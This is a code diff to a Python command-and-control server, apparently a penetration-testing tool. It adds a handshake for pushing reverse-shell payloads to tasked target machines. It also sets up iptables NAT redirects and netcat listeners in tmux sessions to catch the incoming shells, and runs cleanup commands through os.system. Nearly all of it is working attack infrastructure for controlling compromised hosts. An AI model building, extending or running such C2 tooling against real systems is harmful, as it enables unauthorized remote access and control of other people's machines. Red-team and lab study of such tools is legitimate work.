@@ -66,6 +66,12 @@ tasks = {}
 
 #target = None
 
+#{
+#target:{
+#   "cmd":"cmd to fix iptables"
+#}
+#}
+FIN_WAIT = {}
 
 style = Style.from_dict({
     # User input (default text).
@@ -105,15 +111,15 @@ class TrashCollector(BaseHTTPRequestHandler):
 
     def do_GET(self):
         try:
-            path = os.path.normpath("./{}".format(self.path))
-            path = os.path.join(SETTINGS['static_dir'], path)
+            rel_path = os.path.normpath("./{}".format(self.path))
+            path = os.path.join(SETTINGS['static_dir'], rel_path)
 
             logging.info("\tMapping request for {} to {}".format(self.path, path))
 
             f = open(path, 'rb')
             self.send_response(200)
             self.end_headers()
-            
+            print("Serving {} to {}".format(rel_path, self.get_host()))
             shutil.copyfileobj(f, self.wfile)
             f.close()
         except Exception as e:
@@ -178,6 +184,18 @@ class TrashCollector(BaseHTTPRequestHandler):
         #return self.headers["Host"].strip("\r\n")
         return self.client_address[0]
 
+    def handle_special(self, cmd, res):
+        target = self.get_host()
+        special = False
+        if cmd == "shell_ACK":
+            handle_shell(target)
+            special = True
+        elif cmd == "shell_FIN":
+            shell_FIN(target)
+            special = True
+
+        if special:
+            print("C2 Command: {} from {} with val {}".format(cmd, target, res))
 
     def do_POST(self):
         #global target
@@ -220,8 +238,8 @@ class TrashCollector(BaseHTTPRequestHandler):
                     res = post_data[cmd]
                     if type(res) is list and len(res) == 1:
                         res=res[0]
+                    self.handle_special(cmd, res)
                     print(res)
-            
             else:
                 print(post_data)
         target_info = target_info_all[host]
@@ -348,24 +366,68 @@ def new_session(name, window_cmd=None, keys=None, keys_script=None):
     else:
         print("Failed to create tmux session")
 
-# Warning: Linux specific, requires iptables and tmux
-def handle_shell(host):
-    #global tmux
+
+
+def iptables_redirect(host):
     #iptables -t nat -A PREROUTING -p tcp -s {LHOST} --dport {LPORT} -j REDIRECT --to-port {HANDLE_PORT}
     real_port = get_open_port()
     src = ""
     if host != "0.0.0.0/0":
         src = "-s {RHOST} ".format(RHOST=host)
-    iptables = "iptables -t nat -{CMD} PREROUTING -p tcp {src}--dport {LPORT} -j REDIRECT --to-port {REAL_PORT}"
+    iptables = "iptables -t nat -{CMD} PREROUTING -p tcp {src}--dport {LPORT} -j REDIRECT {state}--to-port {REAL_PORT};"
+    state = "-m state --state ESTABLISHED,RELATED "
     
-    handler_cmd = iptables.format(CMD="A", src=src, LPORT=SETTINGS["LPORT"], REAL_PORT=real_port)
-    handler_cmd += "; "
-    handler_cmd += "nc -nvlp {REAL_PORT}".format(REAL_PORT=real_port)
-    handler_cmd += "; "
-    handler_cmd += iptables.format(CMD="D", src=src, LPORT=SETTINGS["LPORT"], REAL_PORT=real_port)
+    add_cmd = iptables.format(CMD="A", src=src, LPORT=SETTINGS["LPORT"], REAL_PORT=real_port, state="")
+    del_cmd = iptables.format(CMD="D", src=src, LPORT=SETTINGS["LPORT"], REAL_PORT=real_port, state="")
+
+    fix_cmd = iptables.format(CMD="A", src=src, LPORT=SETTINGS["LPORT"], REAL_PORT=real_port, state=state)
+    delfix_cmd = iptables.format(CMD="D", src=src, LPORT=SETTINGS["LPORT"], REAL_PORT=real_port, state=state)
+    return {"add":add_cmd, "del":del_cmd, "fix":fix_cmd, "delfix":delfix_cmd, "port":real_port}
+
+
+def get_listener_cmd(port):
+    return "nc -nvlp {REAL_PORT};".format(REAL_PORT=port)
+
+# eventually: targets will be guaranteed unique, hosts (ip address) might not be
+def target_to_host(target):
+    return target
+
+# client said "shell_ACK"
+
+# Warning: Linux specific, requires iptables and tmux
+def handle_shell(target):
+    host = target_to_host(target)
+    #global tmux
+    res = iptables_redirect(host)
+
+    listener = get_listener_cmd(res["port"])
+    # Race conditions just make your code go faster, right?
+    handler_cmd = res["add"] + listener + res["delfix"]
+
     print("Handler: \n{0}\n{1}\n{0}\n".format("-"*(len(handler_cmd) + 3) , handler_cmd))
     new_session(get_session_name(host), window_cmd=handler_cmd)
+    FIN_WAIT[target]["cmd"] = res["del"]+res["fix"]
 
+    send_shell(target, FIN_WAIT[target]["shell"])
+
+
+def get_shell(shell_file):
+    with open(shell_file, 'r') as f:
+        s = f.read()
+        for setting in SETTINGS["vars"]:
+            s = s.replace("{"+setting+"}", str(SETTINGS[setting]))
+        return s
+
+def send_shell(target, s):
+    shell_arr = shlex.split(s)
+    task(target, shell_arr[0], shell_arr[1:] )
+
+def shell_FIN(target):
+    print("Running: {}".format(FIN_WAIT[target]["cmd"]))
+    os.system(FIN_WAIT[target]["cmd"])
+    print("Deleting FIN_WAIT[{}] : ".format(target, FIN_WAIT[target]))
+    del FIN_WAIT[target]
+    
 def in_directory(file, directory):
     #make both absolute    
     directory = os.path.join(os.path.realpath(directory), '')
@@ -401,6 +463,12 @@ def do(cmd):
                 show(c)
         elif c == "options" or c == 'show' and len(arr) > 1 and arr[1] == "options":
             options()
+        elif c =="switch":
+            if targets:
+                t = targets[-1]
+                if t == SETTINGS["target"]:
+                    t = targets[0]
+                set("target", t)
         elif c == "host-shell":
             #print("Dropping to bash on host -- use 'exit' to return here")
             #pty.spawn("/bin/bash")
@@ -455,20 +523,19 @@ def do(cmd):
             if len(arr) > 1 and os.path.exists(compute_path(arr[1], dir=SETTINGS['shell_dir'])):
                 shell_file = compute_path(arr[1], dir=SETTINGS['shell_dir'])
                 print("Reading from {}".format(shell_file))
-                with open(shell_file, 'r') as f:
-                    s = f.read()
-                    for setting in SETTINGS["vars"]:
-                        s = s.replace("{"+setting+"}", str(SETTINGS[setting]))
-
-                    print(s)
-                    if SETTINGS["target"]:
-                        shell_arr = shlex.split(s)
-                        #task(SETTINGS["target"], shell_arr[0], ' '.join(shlex.quote(x) for x in shell_arr[1:]) )
-                        task(SETTINGS["target"], shell_arr[0], shell_arr[1:] )
+                s = get_shell(shell_file)
+                print(s)
+                t = SETTINGS.get("target", None)
+                if t:
+                    if t in FIN_WAIT:
+                        print("A shell handshake for {} is in progress -- wait until shell_FIN is received".format(t))
                     else:
-                        print('Set a target - try "show targets"')
-                    handle_shell(SETTINGS['target'])
-        
+                        task(t, "shell_SYN", None)
+                        print("Waiting for shell_ACK...")
+                        FIN_WAIT[t] = {"shell":s}
+                    
+                else:
+                    print('Set a target - try "show targets"')
             else:
                 print("Possible shells:")
                 for root, dirs, file in os.walk(SETTINGS['shell_dir']):
@@ -476,6 +543,7 @@ def do(cmd):
                         p = os.path.join(root, f)
                         p = p[len(os.path.commonprefix([SETTINGS['shell_dir'], p])):]
                         print(p)
+            
         elif c == 'catch':
             rhost = arr[1]
             handle_shell(rhost)
@@ -526,6 +594,8 @@ def do(cmd):
     except Exception as e:
         print(e)
 
+
+    
 
 def inner_prompt(key, message, default):
     force_prompt[key]={"message":message, "default":default}
@@ -712,7 +782,6 @@ if __name__=="__main__":
     #Start thread in the background
     srv_thread = threading.Thread(target=srv, args=(ip, port))
     srv_thread.daemon = True
-    srv_thread.start()
 
     SETTINGS['static_url'] = "{}://{}:{}/".format(SETTINGS['protocol'], ip, port)
     SETTINGS['LHOST'] = ip
@@ -732,6 +801,7 @@ if __name__=="__main__":
 
     purge_nat()
 
+    srv_thread.start()
     prompt_toolkit.eventloop.defaults.use_asyncio_event_loop() 
 
     loop = asyncio.get_event_loop()
